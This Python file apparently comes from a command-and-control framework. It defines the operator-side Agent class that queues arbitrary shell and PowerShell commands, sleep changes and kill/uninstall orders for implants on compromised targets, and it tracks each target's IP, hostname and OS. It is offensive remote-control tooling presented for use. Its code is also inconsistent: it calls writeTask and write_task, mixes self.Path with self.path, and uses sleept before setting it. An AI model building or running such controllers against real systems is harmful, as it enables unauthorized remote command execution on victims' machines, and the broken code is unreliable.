#!/usr/bin/python3
import os
import time
import red_alert.mastermind.core.menu as men
from .common import *

# choose a random element from a list
from random import seed, choice
from datetime import datetime

from shutil import rmtree


class Agent:
    def __init__(self, listener_name, uuid, tgt_ip, tgt_hostname, tgt_os, tgt_version):
        self.listener_name = listener_name
        self.name = uuid
        self.tgt_ip = tgt_ip
        self.tgt_hostname = tgt_hostname
        self.tgt_os = tgt_os
        self.tgt_version = tgt_version
        self.has_tasks = False
        self.path = f"../data/listeners/{self.listener_name}/agents/{self.name}/"
        self.tasks_path = "{}tasks.txt".format(self.path, self.name)
        # self.task_ids = []

        if not os.path.exists(self.path):
            os.mkdir(self.path)

        # if not os.path.exists(self.tasks_path):
        #     with open(self.tasks_path, "w") as f:
        #         f.write("$\n")
        #         f.close()
        #         # f = open(self.tasks_path, "w")
        #         # f.close()

        self.menu = men.Menu(self.name)
        
        self.menu.registerCommand("cmd", "Execute a shell command.", "<command>")
        self.menu.registerCommand("powershell", "Execute a powershell command.", "<command>")
        self.menu.registerCommand("sleep", "Change agent's sleep time.", "<time (s)>")
        self.menu.registerCommand("clear", "Clear tasks.", "")
        self.menu.registerCommand("kill", "Task agent to kill / uninstall from target.", "")

        self.menu.uCommands()

        self.Commands = self.menu.Commands

    
    def write_task(self, task):

        # Reads file into memory and prepends file with new task.
        # Each task is inserted as beginning of file, as initiate looks for end of file
        # indicator which is "$"


        if not os.path.exists(self.tasks_path):
            with open(self.tasks_path, "w") as f:
                f.write("$\n")
                # f = open(self.tasks_path, "w")
                # f.close()

        with open(self.tasks_path, 'r+') as f:
            content = f.read()
            f.seek(0, 0)
            f.write(task.rstrip('\r\n') + '\n' + content)
            self.has_tasks = True

    def clearTasks(self):

        if os.path.exists(self.tasks_path):
            os.remove(self.tasks_path)
        else:
            pass

    # def update(self):
        
    #     self.menu.name = self.name
    #     self.Path      = "data/listeners/{}/agents/{}/".format(self.listener, self.name)
    #     self.tasks_path = "{}tasks".format(self.Path, self.name)
        
    #     if os.path.exists(self.Path) == False:
    #         os.mkdir(self.Path)
        
    def rename(self, newname):
        
        task    = "rename " + newname
        self.writeTask(task)
        
        progress("Waiting for agent.")
        while os.path.exists(self.tasks_path):
            pass
        
        return 0

    # def get_task_id():
    #     seed(1)
    #     sequence = [i for i in range(1000)]
    #     print(sequence)

    def cmd(self, args):

        if len(args) == 0:
            error("Missing command.")
        else:

            command = " ".join(args)
            task = f"#22 0 {command}\n"
            self.write_task(task)

    def powershell(self, args):
        
        if len(args) == 0:
            error("Missing command.")
        else:
            command = " ".join(args)
            task    = "powershell " + command
            self.writeTask(task)

    def sleep(self, args):

        if len(args) != 1:
            error("Invalid arguments.")
        else:
            time = args[0]

            try:
                temp = int(time)
            except:
                error("Invalid time.")
                return 0
            
            task = "sleep {}".format(time)
            self.write_task(task)
            self.sleept = int(time)
            removeFromDatabase(agentsDB, self.name)
            writeToDatabase(agentsDB, self)

    def QuitandRemove(self):

        self.Quit()

        rmtree(self.Path)
        # removeFromDatabase(agentsDB,self.name)

        men.Menu.home()
        
        return 0

    def Quit(self):
        
        self.write_task("quit")

        progress("Waiting for agent.")

        for i in range(self.sleept):
            
            if os.path.exists(self.tasks_path):
                time.sleep(1)
            else:
                break

        return 0

    def ev(self, command, args):

        if command == "help":
            self.menu.showHelp()
        elif command == "home":
            men.home()
        elif command == "exit":
            men.exit()
        elif command == "cmd":
            self.cmd(args)
        elif command == "powershell":
            self.powershell(args)
        elif command == "sleep":
            self.sleep(args)
        elif command == "clear":
            self.clearTasks()
        elif command == "quit":
            self.QuitandRemove()

    def task_agent(self):

        self.menu.clearScreen()

        while True:
            
            try:
                command, args = self.menu.parse()
            except:
                continue
            
            if command not in self.Commands:
                error("Invalid command.")
            else:
                self.ev(command, args)